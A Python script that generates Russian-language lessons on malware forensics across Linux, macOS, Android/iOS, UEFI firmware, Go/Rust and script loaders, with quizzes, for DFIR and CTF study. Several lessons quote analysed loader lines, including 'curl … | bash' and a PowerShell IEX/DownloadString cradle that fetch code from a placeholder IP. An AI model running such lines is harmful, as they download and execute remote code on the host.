#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""gB forensics gaps: malware families (hub + 6 lessons)."""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _fgaps_common import emit  # noqa: E402

HUBS = {}
LESSONS = {}

HUBS["forensics-malware-families"] = r'''---
id: forensics-malware-families
title: "Модуль: семейства малвари — Linux, macOS, мобильные, прошивки"
category: forensics
parent: forensics-malware-advanced
difficulty: hard
order: 5
tags: [malware, linux, macos, mobile, firmware, go, rust, forensics, roadmap]
prerequisites: [forensics-malware-yara]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Анализ вредоносного ПО"
estimated_minutes: 13
summary: "Этап ветки «малварь»: как выглядят образцы под разные платформы — Linux, macOS, мобильные ОС, прошивки, а также Go/Rust-вредоносы."
---

Большинство учебных материалов про малварь — про Windows PE. Но вредоносное ПО живёт
везде: на Linux-серверах, Mac, телефонах и даже в прошивках. У каждой платформы свои
форматы, загрузчики и артефакты. Этот модуль — про них.

## Что покрывает этот модуль

- **Linux-малварь** — ELF, руткиты, криптомайнеры.
- **macOS-малварь** — Mach-O, adware, зловреды в .app.
- **Мобильная малварь** — Android APK, iOS.
- **Прошивочная малварь** — UEFI/BIOS-импланты.
- **Go/Rust-образцы** — большие статические бинарники.

## Рекомендуемый порядок изучения

1. `mal-linux-malware` — самый частый «серверный» вариант.
2. `mal-macos-malware` — Mach-O и подписи.
3. `mal-mobile-malware` — Android/iOS.
4. `mal-firmware-malware` — низкий уровень.
5. `mal-go-rust` — современные компиляторы.
6. `mal-script-js` — скриптовые загрузчики.

## Что вы будете уметь

- Определять формат образца под каждую платформу.
- Находить загрузчики и персистентность.
- Извлекать C2 и конфигурацию.
- Понимать особенности Go/Rust-бинарников.

## Артефакт → вопрос

| Артефакт | Отвечает на вопрос | Инструмент |
|----------|--------------------|------------|
| ELF | Linux-образец | `file`, `readelf`, `strings` |
| Mach-O | macOS-образец | `file`, `otool` |
| APK/DEX | Android-образец | `apktool`, `jadx` |
| UEFI-модуль | прошивочный имплант | `UEFITool` |
| Go/Rust-бинарник | статический образец | `strings`, `GoReSym` |

## Куда дальше

Открывай урок **«Linux-малварь: ELF и руткиты»** — начнём с серверного варианта.
'''

LESSONS["mal-linux-malware"] = dict(
parent="forensics-malware-families", order=1, diff="hard", mins=50,
title="Linux-малварь: ELF, руткиты и криптомайнеры",
tags="[malware, linux, elf, rootkit, miner, forensics]",
prereq="[forensics-malware-yara]",
summary="Как выглядят Linux-образцы: ELF-бинарники, руткиты, криптомайнеры и их типичные артефакты.",
body=r'''
## Вопрос, с которого всё начинается

Linux-серверы — излюбленная цель: на них майнят крипту, строят ботнеты, прячут руткиты.
Формат образца — **ELF**. Разберём, как распознать Linux-малварь и что она оставляет.

## Наш пример: подозрительный ELF

## Шаг 1: определяем формат

```
$ file /opt/.hidden/x
/opt/.hidden/x: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
```

`statically linked` + `stripped` — типичные признаки малвари: нет зависимостей (работает
везде) и нет символов (сложнее анализировать).

## Шаг 2: статический анализ

```
$ strings /opt/.hidden/x | grep -iE 'http|stratum|xmr|pool' | head
stratum+tcp://pool.example:3333
```

`stratum` и `xmr` — маркеры **криптомайнера** (добывает Monero). Адрес пула — прямой IOC.

## Шаг 3: персистентность

Linux-малварь закрепляется несколькими способами:

```
$ crontab -l | grep -v '^#'
@reboot /opt/.hidden/x
```

А ещё — systemd-юниты, `/etc/rc.local`, `~/.bashrc`, LD_PRELOAD.

```
$ grep -rl '/opt/.hidden' /etc/systemd/system/
```

## Шаг 4: руткит-признаки

Если малварь — руткит, она прячет себя. Проверяем расхождения:

```
$ ps aux | grep -c '[x]'
$ ls /proc | grep -c '^[0-9]'
```

Несовпадение списка процессов с содержимым `/proc` — признак сокрытия. Глубже —
сравнение адресов структур ядра на дампе памяти.

## Шаг 5: сетевые следы

```
$ ss -tunap | grep -i x
tcp ESTAB 0 0 10.10.20.5:443 203.0.113.5:443 users:(("x",pid=991))
```

Соединение на пул/C2. Сопоставь с `crontab` и временем запуска.

## Что мы теперь знаем

- Linux-образцы — ELF, часто static+stripped.
- Криптомайнеры выдают строки `stratum`/`xmr`.
- Персистентность: cron, systemd, rc.local, bashrc, LD_PRELOAD.
- Руткит прячется — ищи расхождения в `/proc`.
- Сетевые следы ведут к пулу/C2.

## Если не сработало

- Бинарник зашифрован? Нужен динамический анализ/распаковка.
- Нет прав? Анализируй копию в песочнице.
- Руткит в ядре? Нужен дамп памяти и Volatility.

## Квиз

Проверь себя.

```quiz
- question: Какой формат у Linux-исполняемых файлов?
  options:
    - 'PE'
    - 'ELF'
    - 'Mach-O'
    - 'DEX'
  answer: 1
  explanation: 'Linux использует ELF (Executable and Linkable Format).'
- question: Что выдаёт криптомайнер в строках?
  options:
    - 'SQL-запросы'
    - 'stratum/xmr (пул для майнинга)'
    - 'HTTP-заголовки'
    - 'ARP'
  answer: 1
  explanation: 'Stratum-протокол и монета xmr указывают на майнер.'
- question: Как Linux-малварь закрепляется?
  options:
    - 'только через реестр'
    - 'через cron, systemd, rc.local, bashrc'
    - 'через WMI'
    - 'никак'
  answer: 1
  explanation: 'Это основные механизмы автозапуска в Linux.'
- question: Признак руткита?
  options:
    - 'высокая нагрузка'
    - 'расхождение списка процессов и /proc'
    - 'много DNS'
    - 'мало места'
  answer: 1
  explanation: 'Руткит скрывает процессы, создавая расхождения.'
```
''')

LESSONS["mal-macos-malware"] = dict(
parent="forensics-malware-families", order=2, diff="hard", mins=45,
title="macOS-малварь: Mach-O, .app и обход подписи",
tags="[malware, macos, macho, codesign, forensics]",
prereq="[forensics-malware-yara]",
summary="Как выглядят macOS-образцы: формат Mach-O, структура .app, adware и обход подписи Gatekeeper.",
body=r'''
## Вопрос, с которого всё начинается

macOS считается безопасной, но малварь для неё существует: adware, стилеры, бэкдоры.
Формат — **Mach-O**, упаковка — `.app`. Разберём, как распознать и проанализировать.

## Наш пример: подозрительный .app

## Шаг 1: структура .app

`.app` — это не файл, а **каталог**:

```
$ find /Applications/Suspicious.app -maxdepth 3 -type f | head
/Applications/Suspicious.app/Contents/MacOS/Suspicious
/Applications/Suspicious.app/Contents/Info.plist
```

Исполняемый файл — в `Contents/MacOS/`. `Info.plist` описывает приложение.

## Шаг 2: формат Mach-O

```
$ file /Applications/Suspicious.app/Contents/MacOS/Suspicious
Mach-O 64-bit executable x86_64
```

Mach-O — формат macOS. Он может содержать несколько архитектур (fat/universal):

```
$ lipo -info .../Suspicious
Architectures in the fat file: x86_64 arm64
```

## Шаг 3: подпись

```
$ codesign -dv --verbose=4 .../Suspicious
Identifier=com.suspicious.app
Authority=Developer ID Application: Unknown (ABCD1234)
```

Если подпись отсутствует или `Authority` неизвестен — приложение не запустится без
обхода Gatekeeper. Проверь, как пользователь его открыл.

## Шаг 4: типичные артефакты

- **LaunchAgents** — автозапуск (`~/Library/LaunchAgents/*.plist`);
- **login items**;
- **обход Gatekeeper** (`xattr -d com.apple.quarantine`);
- **встроенные скрипты** (AppleScript, shell).

```
$ ls ~/Library/LaunchAgents/
com.suspicious.updater.plist
```

## Шаг 5: статический анализ

```
$ strings .../Suspicious | grep -iE 'http|curl|bash' | head
curl -s http://203.0.113.5/x | bash
```

Скачивание и исполнение скрипта — классический загрузчик.

## Что мы теперь знаем

- `.app` — каталог; бинарник в `Contents/MacOS/`.
- Mach-O — формат macOS, бывает fat (несколько архитектур).
- `codesign` проверяет подпись.
- LaunchAgents/login items — персистентность.
- Обход карантина — типичный шаг adware.

## Если не сработало

- Бинарник зашифрован? Нужен динамический анализ.
- Swift/Objective-C? Смотри `otool -L` и строки классов.
- Нужна подпись? `codesign -vvv` покажет детали.

## Квиз

Проверь себя.

```quiz
- question: Какой формат у исполняемых файлов macOS?
  options:
    - 'ELF'
    - 'Mach-O'
    - 'PE'
    - 'DEX'
  answer: 1
  explanation: 'macOS использует Mach-O.'
- question: Что такое .app?
  options:
    - 'файл'
    - 'каталог с бинарником и Info.plist'
    - 'архив'
    - 'образ диска'
  answer: 1
  explanation: '.app — каталог, исполняемый файл в Contents/MacOS/.'
- question: Чем проверяют подпись приложения?
  options:
    - 'ls'
    - 'codesign'
    - 'grep'
    - 'cp'
  answer: 1
  explanation: 'codesign -dv показывает идентификатор и Authority.'
- question: Типичный механизм персистентности в macOS?
  options:
    - 'реестр'
    - 'LaunchAgents / login items'
    - 'crontab (всегда)'
    - 'WMI'
  answer: 1
  explanation: 'launchd-агенты и элементы входа — основной автозапуск.'
```
''')

LESSONS["mal-mobile-malware"] = dict(
parent="forensics-malware-families", order=3, diff="hard", mins=50,
title="Мобильная малварь: Android APK и iOS",
tags="[malware, mobile, android, apk, ios, forensics]",
prereq="[forensics-malware-yara]",
summary="Как анализировать мобильные образцы: структура APK, DEX, разрешения, и особенности iOS-вредоносов.",
body=r'''
## Вопрос, с которого всё начинается

Пользователь установил приложение из ненадёжного источника. Это банковский троян или
стилер? Android-образцы упакованы в **APK**, внутри — **DEX**-байткод. Разберём, как
смотреть.

## Наш пример: подозрительный APK

## Шаг 1: что такое APK

APK — это ZIP-архив:

```
$ unzip -l suspicious.apk | head
  classes.dex
  AndroidManifest.xml
  res/...
  META-INF/...
```

Внутри: `classes.dex` (код), `AndroidManifest.xml` (манифест), ресурсы, подписи.

## Шаг 2: разрешения

Манифест — бинарный XML. Декодируем `apktool`:

```
$ apktool d suspicious.apk -o out/
$ grep -i 'uses-permission' out/AndroidManifest.xml
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.ACCESSIBILITY_SERVICE"/>
```

`SEND_SMS` + `READ_SMS` + Accessibility — классический набор банковского трояна
(перехват OTP, автоклики).

## Шаг 3: код

`jadx` декомпилирует DEX в Java:

```
$ jadx -d out_jadx suspicious.apk
$ grep -riE 'http|bot|token' out_jadx/sources/ | head
```

Ищем URL C2, команды, эксфильтрацию.

## Шаг 4: подпись и репак

```
$ apksigner verify --print-certs suspicious.apk
```

Самоподписанный сертификат и несоответствие имени пакета оригиналу — признак
**репакинга** (переупаковки легитимного приложения с вредоносной нагрузкой).

## Шаг 5: iOS

iOS-образцы обычно требуют jailbreak или используют конфигурационные профили. Формат —
**IPA** (ZIP с `.app`), код — Mach-O (ARM64). Анализ похож на macOS, но с шифрованием
App Store (снимается на устройстве).

## Что мы теперь знаем

- APK — ZIP с DEX и манифестом.
- `apktool` декодирует манифест, `jadx` — код.
- Набор разрешений выдаёт назначение.
- `apksigner` проверяет подпись; репак меняет сертификат.
- iOS-образцы — IPA/Mach-O, часто требуют jailbreak.

## Если не сработало

- APK обфусцирован? Используй deobfuscator и динамический анализ.
- DEX зашифрован? Ищи загрузчик, который его расшифрует.
- iOS зашифрован? Снимай с jailbreak-устройства.

## Квиз

Проверь себя.

```quiz
- question: Что такое APK?
  options:
    - 'исполняемый файл'
    - 'ZIP-архив с DEX и манифестом'
    - 'образ диска'
    - 'база данных'
  answer: 1
  explanation: 'APK — zip-контейнер приложения Android.'
- question: Какой инструмент декодирует манифест APK?
  options:
    - 'grep'
    - 'apktool'
    - 'readelf'
    - 'otool'
  answer: 1
  explanation: 'apktool распаковывает и декодирует бинарный манифест.'
- question: Набор разрешений SEND_SMS+READ_SMS+Accessibility означает?
  options:
    - 'фонарик'
    - 'банковский троян (перехват OTP/автоклики)'
    - 'калькулятор'
    - 'браузер'
  answer: 1
  explanation: 'Это классические права для перехвата SMS и управления экраном.'
- question: Что такое репакинг?
  options:
    - 'сжатие'
    - 'переупаковка приложения с вредоносной нагрузкой'
    - 'обновление'
    - 'шифрование'
  answer: 1
  explanation: 'Злоумышленник встраивает код в легитимное приложение и подписывает заново.'
```
''')

LESSONS["mal-firmware-malware"] = dict(
parent="forensics-malware-families", order=4, diff="hard", mins=55,
title="Прошивочная малварь: UEFI, BIOS и импланты",
tags="[malware, firmware, uefi, bios, implant, forensics]",
prereq="[forensics-malware-yara]",
summary="Как устроена прошивочная малварь (UEFI/BIOS-импланты), почему её трудно найти и как анализировать образы прошивок.",
body=r'''
## Вопрос, с которого всё начинается

Переустановка ОС не помогает — заражение возвращается. Значит, малварь живёт **ниже**
операционной системы: в прошивке. Это самый глубокий уровень persistence. Разберём,
как её искать.

## Наш пример: образ прошивки

## Шаг 1: что такое UEFI-прошивка

Прошивка — это код, который запускается первым. В современном ПК это **UEFI**,
состоящий из модулей (DXE-драйверы). Модуль может быть подменён или добавлен.

## Шаг 2: снимаем образ

Образ прошивки получают программатором (SPI-флеш) или программно:

```
$ sudo flashrom -p internal -r firmware.bin
```

Для анализа нужен именно дамп чипа, а не «бэкап BIOS» из ОС.

## Шаг 3: разбираем модули

`UEFITool` показывает структуру:

```
$ uefiextract firmware.bin
$ ls firmware.bin.dump/ | head
```

Ищем модули, которых не должно быть: с незнакомыми GUID, невалидной подписью,
несоответствием вендору.

## Шаг 4: признаки импланта

- **лишний DXE-драйвер** с сетевым/дисковым доступом;
- **подмена DXE Core** (перехват загрузки);
- **модифицированный NVRAM** (переменные загрузки);
- **несоответствие хешей** с эталонной прошивкой вендора.

Сравни с оригиналом от производителя:

```
$ sha256sum firmware.bin vendor_firmware.bin
```

## Шаг 5: что делает имплант

Прошивочный имплант может:

- перехватывать загрузку ОС (загружать свой код);
- красть ключи BitLocker при разблокировке;
- восстанавливать себя после переустановки;
- обходить Secure Boot.

## Что мы теперь знаем

- Прошивка запускается первой; UEFI состоит из модулей.
- Образ снимают программатором/`flashrom`.
- `UEFITool`/`uefiextract` разбирают структуру.
- Лишние/подменённые модули — признак импланта.
- Сравнение с эталоном вендора выявляет подмену.

## Если не сработало

- Нет эталона? Сравни с прошивкой того же вендора/версии.
- Прошивка подписана? Проверь Secure Boot и его обход.
- Нужен уровень ниже? Анализируй ME/PSP (отдельные процессоры).

## Квиз

Проверь себя.

```quiz
- question: Почему прошивочная малварь опаснее файловой?
  options:
    - 'она быстрее'
    - 'она выживает переустановку ОС'
    - 'она шифрует'
    - 'она меньше'
  answer: 1
  explanation: 'Прошивка переживает смену ОС и хранится вне диска.'
- question: Как снять образ прошивки?
  options:
    - 'cp /boot'
    - 'flashrom / программатор'
    - 'grep'
    - 'ls'
  answer: 1
  explanation: 'flashrom или внешний программатор читает SPI-чип.'
- question: Что искать в образе UEFI?
  options:
    - 'пароли'
    - 'лишние/подменённые модули'
    - 'DNS'
    - 'обои'
  answer: 1
  explanation: 'Незнакомые DXE-модули и подмена Core — признаки импланта.'
- question: Как подтвердить подмену модуля?
  options:
    - 'перезагрузиться'
    - 'сравнить хеши с эталонной прошивкой вендора'
    - 'отключить сеть'
    - 'по дате'
  answer: 1
  explanation: 'Сравнение с оригиналом показывает изменённые модули.'
```
''')

LESSONS["mal-go-rust"] = dict(
parent="forensics-malware-families", order=5, diff="hard", mins=50,
title="Go и Rust-малварь: особенности статических бинарников",
tags="[malware, golang, rust, static, forensics]",
prereq="[forensics-malware-yara]",
summary="Чем Go/Rust-образцы отличаются от C/C++: большие статические бинарники, свои рантаймы, как их анализировать.",
body=r'''
## Вопрос, с которого всё начинается

Современная малварь всё чаще пишется на **Go** и **Rust**. Такие образцы — большие,
статические, со своим рантаймом. Обычные приёмы анализа дают много шума. Разберём
особенности.

## Наш пример: Go-образец

## Шаг 1: как распознать

```
$ file sample.bin
sample.bin: ELF 64-bit LSB executable, statically linked, not stripped
$ ls -la sample.bin
-rwxr-xr-x 1 root root 8.2M sample.bin
```

Размер в мегабайты + `not stripped` + `static` — почти наверняка Go. Строки содержат
пути рантайма:

```
$ strings sample.bin | grep -m3 'go1\.'
go1.21.5
```

`go1.x` — версия компилятора. Для Rust — ищи `rustc` и `core::`.

## Шаг 2: символы Go

Go-бинарники часто **не stripped**, и это подарок:

```
$ go tool nm sample.bin 2>/dev/null | grep -i 'main\.' | head
```

Имена функций `main.main`, `main.beacon` дают структуру. `GoReSym` восстанавливает
символы, если их почистили.

## Шаг 3: строки и конфиг

```
$ strings sample.bin | grep -iE 'http|10\.10' | head
https://203.0.113.5/api
```

В Go-малвари строки лежат плотно; часто весь C2-конфиг виден в `strings`.

## Шаг 4: крипто-библиотеки

Go несёт в себе `crypto/tls`, `crypto/aes` — их символы указывают на шифрование:

```
$ go tool nm sample.bin 2>/dev/null | grep -i 'crypto/tls' | head
```

Rust использует `ring`, `openssl`; ищи соответствующие символы.

## Шаг 5: анализ

- **`strings` + `grep`** — быстрый старт;
- **`GoReSym`/`redress`** — восстановление типов и символов;
- **YARA** — правила под Go/Rust;
- **Динамика** — рантайм создаёт много потоков (goroutines).

## Что мы теперь знаем

- Go/Rust-образцы — большие статические бинарники.
- Go выдаёт `go1.x` в строках, Rust — `rustc`.
- Go часто не stripped — символы дают структуру.
- Конфиг C2 виден в `strings`.
- Рантайм-библиотеки (crypto/tls) дают зацепки.

## Если не сработало

- Символы удалены? Используй GoReSym.
- Обфускация (garble)? Часть имён восстановима по строкам.
- Нужна логика? Динамический анализ в песочнице.

## Квиз

Проверь себя.

```quiz
- question: Как отличить Go-бинарник?
  options:
    - 'маленький размер'
    - 'большой статический бинарник + строки go1.x'
    - 'нет строк'
    - 'формат PE'
  answer: 1
  explanation: 'Go-образцы крупные, статические и содержат версию рантайма.'
- question: Что даёт go tool nm?
  options:
    - 'сеть'
    - 'таблицу символов (имена функций)'
    - 'пароли'
    - 'обои'
  answer: 1
  explanation: 'nm показывает символы; у Go часто видны имена main.*.'
- question: Чем полезен GoReSym?
  options:
    - 'шифрует'
    - 'восстанавливает символы/типы Go-бинарника'
    - 'удаляет файлы'
    - 'сканирует сеть'
  answer: 1
  explanation: 'GoReSym реконструирует метаданные Go даже после stripping.'
- question: Почему Rust-образцы узнаваемы?
  options:
    - 'по расширению'
    - 'по строкам rustc/ring и структуре'
    - 'по размеру 1 КБ'
    - 'по имени'
  answer: 1
  explanation: 'Строки и символы Rust-рантайма/крейтов выдают компилятор.'
```
''')

LESSONS["mal-script-js"] = dict(
parent="forensics-malware-families", order=6, diff="medium", mins=45,
title="Скриптовая малварь: JavaScript, PowerShell и shell",
tags="[malware, javascript, powershell, shell, obfuscation, forensics]",
prereq="[forensics-malware-yara]",
summary="Как анализировать скриптовые загрузчики: JavaScript, PowerShell и shell — обфускация, декодирование и типовые цепочки.",
body=r'''
## Вопрос, с которого всё начинается

Малварь всё чаще не бинарник, а **скрипт**: JavaScript, PowerShell, shell. Их легко
обфусцировать и запустить без компиляции. Разберём, как распознать и распутать.

## Наш пример: обфусцированный JS

## Шаг 1: что видно

```
$ head -c 300 sample.js
var _0x1a2b=["\x68\x74\x74\x70...","\x62\x61\x73\x68"...];(function(_0x3c4d,_0x5e6f){...})();
```

Шестнадцатеричные escape-последовательности и случайные имена — классическая
обфускация (обфускатор типа `javascript-obfuscator`).

## Шаг 2: декодируем строки

Строки собираются из hex/массивов. Быстрый способ — выполнить только построение
строк в песочнице (Node.js `vm` без I/O):

```
$ node -e "console.log(Buffer.from('68747470','hex').toString())"
http
```

Или использовать `de4js`/`js-beautify` + ручной разбор. Цель — получить читаемый код.

## Шаг 3: PowerShell

Обфускация в PowerShell — через Base64 и `-EncodedCommand`:

```
PS> [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABj...'))
$c = 'http://203.0.113.5/x'; IEX (New-Object Net.WebClient).DownloadString($c)
```

`IEX` + `DownloadString` = скачивание и исполнение. Это ядро «файл-less» атаки.

## Шаг 4: shell-загрузчики

```
$ cat loader.sh
curl -s http://203.0.113.5/x | bash
```

Или через `eval`, `base64 -d`, `nc`. Просто, но эффективно.

## Шаг 5: что искать

- URL и IP;
- команды (`IEX`, `eval`, `curl|bash`);
- кодировки (Base64, hex, gzip);
- вызовы системных API;
- persistence-команды (crontab, Run-ключ).

## Что мы теперь знаем

- Скриптовая малварь = JS/PowerShell/shell-загрузчик.
- Обфускация: hex-строки, случайные имена, Base64.
- `IEX`+`DownloadString` — типовой PowerShell-загрузчик.
- `curl|bash` — простейший shell-загрузчик.
- Декодируй строки в изолированной песочнице.

## Если не сработало

- Многослойная обфускация? Декодируй по слоям.
- Выполнение кода при разборе? Используй статический парсер, не запускай.
- Нужна логика? Динамический анализ в песочнице.

## Квиз

Проверь себя.

```quiz
- question: Какой приём типичен для PowerShell-малвари?
  options:
    - 'SQL-инъекция'
    - 'IEX + DownloadString'
    - 'ARP-спуфинг'
    - 'DNS-туннель'
  answer: 1
  explanation: 'IEX исполняет скачанный скрипт — классический «файл-less» загрузчик.'
- question: Что означает hex-строки в JS?
  options:
    - 'ошибку'
    - 'обфускацию строк'
    - 'шифрование диска'
    - 'сетевой запрос'
  answer: 1
  explanation: 'Обфускаторы прячут строки в escape/hex-последовательностях.'
- question: Что делает curl -s URL | bash?
  options:
    - 'сохраняет файл'
    - 'скачивает и сразу исполняет скрипт'
    - 'шифрует'
    - 'удаляет логи'
  answer: 1
  explanation: 'Пайп в bash исполняет скачанное содержимое.'
- question: Почему опасно просто «запустить» образец?
  options:
    - 'он большой'
    - 'скрипт может выполнить вредоносные действия'
    - 'он старый'
    - 'он бесплатный'
  answer: 1
  explanation: 'Скрипт сразу исполняет код; анализ ведут статически/в песочнице.'
```
''')

emit(HUBS, LESSONS)
